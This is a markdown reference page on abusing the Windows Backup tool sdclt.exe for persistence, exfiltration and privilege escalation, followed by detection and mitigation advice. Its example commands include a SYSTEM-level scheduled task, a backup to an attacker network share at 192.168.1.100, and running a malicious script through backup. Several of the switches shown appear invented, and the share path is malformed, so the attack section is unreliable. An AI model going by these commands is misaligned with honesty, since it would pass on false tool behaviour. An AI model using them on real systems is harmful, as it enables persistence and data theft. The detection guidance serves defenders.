# sdclt.exe
## What is it?
*```sdclt.exe``` (Windows Backup) is a **built-in Windows utility** that provides a graphical interface for managing backup and restore operations. It is used to schedule backups of user data and system files, creating restore points for system recovery.*

*While typically used for legitimate backup purposes, its trusted nature and access to system resources can be exploited by attackers to maintain persistence or execute malicious actions.*

## Legitimate Usage
- **Backup Creation** → Allows users to create regular backups of their system and data.
- **System Recovery** → Restores data or system settings from previously created backups or restore points.
- **Automated Backups** → Schedules automatic backups to ensure data protection against system failure.
- **Restore Points** → Creates restore points to roll back to a previous system state in case of issues.

## How to abuse it
- **Persistence via Scheduled Tasks** → Attackers can schedule ```sdclt.exe``` to run at specific intervals, ensuring the execution of malicious payloads or scripts at system startup or at predefined times.
- **Bypassing Security Controls** → Attackers can use ```sdclt.exe``` to bypass security monitoring, since it is a legitimate system tool often overlooked by security software.
- **Exfiltration & Data Manipulation** → Attackers can manipulate the backup process to exfiltrate or modify data during the backup operation.
- **Privilege Escalation** → Attackers may abuse the backup process to execute commands with elevated privileges, as backup operations often run with administrator rights.

## Example attacks
### 1. Persistence via Scheduled Backup
*Attackers can schedule ```sdclt.exe``` to create backups of malicious files at regular intervals, ensuring persistence on the system.*

**Schedule Malicious Backup Task**

```
schtasks /create /tn "BackupJob" /tr "sdclt.exe /configure /backup" /sc daily /ru SYSTEM
```

**Effect:**
- **Backup job** is created to run daily with **SYSTEM privileges**, ensuring persistence for the attacker.

### 2. Data Exfiltration via Backup Files
*Attackers can use the backup process to exfiltrate sensitive files during the backup, hiding the data theft within legitimate activity.*

**Create Backup to External Location**

```
sdclt.exe /configure /backup /target:\192.168.1.100\share
```

**Effect:**
- **Sensitive data** is backed up to an attacker-controlled network share, exfiltrating it unnoticed.

### 3. Abuse of Restore Points for Malicious Payloads
*Attackers can place malicious payloads into system restore points, using ```sdclt.exe``` to restore them at a later time.*

**Restore Malicious Files via Restore Point**

```
sdclt.exe /restore /restorepoint:5
```

**Effect:**
- **Malicious files** are restored, allowing the attacker to execute payloads after a system recovery.

### 4. Elevation of Privileges via Backup Operations
*Backup operations are often run with elevated privileges, allowing attackers to execute malicious code or scripts with administrator rights.*

**Run Malicious Script via Backup Configuration**

```
sdclt.exe /configure /backup /script:C:\path\to\malicious_script.bat
```

**Effect:**
- **Malicious script** runs with elevated privileges during the backup process, potentially escalating privileges.

### 5. Hiding Malicious Activities within Backup Processes
*Attackers can hide their activities within legitimate backup operations, evading detection from security monitoring tools.*

**Create Hidden Backup to Evade Detection**

```
sdclt.exe /configure /backup /target:C:\Windows\Temp
```

**Effect:**
- **Malicious files** are hidden within backup files in **C:\Windows\Temp**, bypassing security detection.

# Detection & Mitigation
## Detection Methods
**Monitor Scheduled Tasks**
- **Event ID 4698 (Scheduled Task Created)** → Detect creation of new scheduled tasks related to ```sdclt.exe```.
- **Look for Unusual Backup Locations** → Monitor for backups targeting network shares or unusual paths (e.g., external drives, remote systems).

**Monitor Process Execution**
- **Event ID 4688 (Process Creation)** → Detect execution of ```sdclt.exe``` with unusual parameters or in unexpected contexts (e.g., running with SYSTEM privileges).
- **Look for Backup Operations with Scripts** → Track the use of scripts or additional payloads in backup configurations.

**File Integrity Monitoring**
- **Monitor Changes to Backup Files** → Set up alerts for unexpected modifications to backup files, particularly in sensitive directories.

## Mitigation Strategies
- **Restrict Scheduled Task Creation** → Use Group Policy to restrict the creation of new scheduled tasks for untrusted users or applications.
- **Use Application Whitelisting** → Prevent the execution of unauthorized instances of ```sdclt.exe``` using tools like AppLocker or WDAC.
- **Monitor Backup Activity** → Set up alerts for backup operations, especially those that involve external locations or script execution.
- **Limit User Privileges** → Ensure that only trusted administrators have access to backup and restore functionality.
